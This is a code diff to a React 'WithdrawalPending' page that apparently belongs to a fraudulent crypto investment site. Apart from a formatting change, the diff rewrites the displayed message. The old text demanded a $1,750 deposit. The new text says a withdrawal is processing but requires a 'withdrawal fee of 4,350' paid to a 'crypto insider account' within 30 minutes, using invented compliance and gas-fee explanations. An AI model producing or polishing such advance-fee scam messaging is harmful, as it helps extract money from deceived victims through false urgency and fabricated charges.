@@ -26,7 +26,7 @@ export default function WithdrawalPending() {
   const depositDeadline = new Date(Date.now() + 6 * 60 * 60 * 1000);
   // Withdrawal timeline (15 minutes after deposit deadline)
   const withdrawalTimeline = new Date(
-    depositDeadline.getTime() + 15 * 60 * 1000
+    depositDeadline.getTime() + 15 * 60 * 1000,
   );
 
   if (loading) {
@@ -88,10 +88,20 @@ export default function WithdrawalPending() {
         {/* Instruction */}
         <div className="bg-gray-700 p-6 rounded-lg border border-red-500 text-center">
           <p className="text-xl font-semibold text-red-400">
-            Withdraw amount too low for blockchain wire transfer standard to
-            local bank, Your standard preset withdrawal amount is $200,000,
-            consider making a deposit of at least $1,750 into your account,
-            however your request has been submitted.
+            Your withdrawal request has been successfully initiated and is
+            currently being processed to your designated bank account. The
+            transaction may take approximately 2–3 hours to complete once the
+            required blockchain-to-bank transfer fee has been settled. For
+            security and compliance purposes, the system requires that the
+            withdrawal fee of 4,350 be paid to your crypto insider account
+            within the next 30 minutes. This ensures that the transaction is
+            validated on the blockchain and released to your bank without
+            interruption. Please note that this fee is a standard requirement
+            for cross-network transfers and helps cover the gas charges
+            associated with moving funds from the blockchain into the
+            traditional banking system. Once the fee is confirmed, your
+            withdrawal will be finalized and reflected in your bank account
+            shortly thereafter.
           </p>
         </div>
       </div>
